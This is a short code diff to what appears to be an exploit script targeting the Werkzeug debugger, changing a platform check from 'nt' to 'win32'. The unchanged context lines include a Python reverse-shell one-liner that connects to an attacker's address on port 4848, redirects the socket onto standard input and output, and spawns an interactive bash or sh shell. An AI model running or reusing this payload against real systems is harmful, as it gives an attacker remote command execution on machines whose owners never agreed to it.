@@ -49,7 +49,7 @@ if not 'Werkzeug ' in r.text:
     sys.exit(-1)
     
 sh = 'bash'
-if sys.platform == 'nt':
+if sys.platform == 'win32':
     sh = 'sh'
     
 shell = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",4848));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/%s","-i"])' % (local, sh)
